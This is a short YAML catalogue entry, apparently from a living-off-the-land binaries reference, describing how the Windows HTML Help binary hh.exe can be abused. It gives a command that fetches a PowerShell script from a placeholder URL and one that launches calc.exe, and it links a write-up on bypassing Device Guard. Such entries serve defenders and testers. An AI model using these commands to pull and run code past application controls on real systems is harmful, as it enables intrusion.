---
name: hh.exe
description: binary used for processing chm files in Windows.
functions:
  download:
    - description: Open the target PowerShell script with HTML Help.
      code: HH.exe http://some.url/script.ps1
  execute:
    - description: Executes calc.exe with HTML Help.
      code: HH.exe c:\windows\system32\calc.exe
resources: 
    - resource: https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/
fullpath: 
    - path: c:\windows\system32\hh.exe
    - path: c:\windows\sysWOW64\hh.exe
notes: Thanks to Oddvar Moe - @oddvarmoe
---